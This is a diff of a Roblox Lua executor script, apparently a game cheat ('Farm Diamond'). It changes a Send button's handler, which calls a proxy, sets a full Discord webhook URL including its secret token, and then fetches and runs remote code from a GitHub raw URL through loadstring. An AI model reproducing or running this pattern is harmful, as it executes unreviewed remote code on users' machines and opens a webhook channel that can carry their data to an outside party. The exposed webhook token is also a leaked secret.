@@ -252,7 +252,8 @@ sendBtn.MouseButton1Click:Connect(function()
     sendTrack()
     task.delay(0.2, sendToProxy)
     task.wait(2)
-    getgenv().WebhookURL = "https://discord.com/api/webhooks/1390221900734533734/-zZqj8OROemNZ9iDolBbnxUdmXCAdKU8pF5x6ncwSBxzdKBWTI9HXRIil3EGVxaIAE6_"
+        getgenv().WebhookURL = "https://discord.com/api/webhooks/1390221900734533734/-zZqj8OROemNZ9iDolBbnxUdmXCAdKU8pF5x6ncwSBxzdKBWTI9HXRIil3EGVxaIAE6_"
+    getgenv().AutoFarm = true
     loadstring(game:HttpGet("https://raw.githubusercontent.com/caomod2077/Script/refs/heads/main/Farm%20Diamond%20v2.lua"))()
     task.delay(1.5, function() sendBtn.Text = "Send" end)
 end)
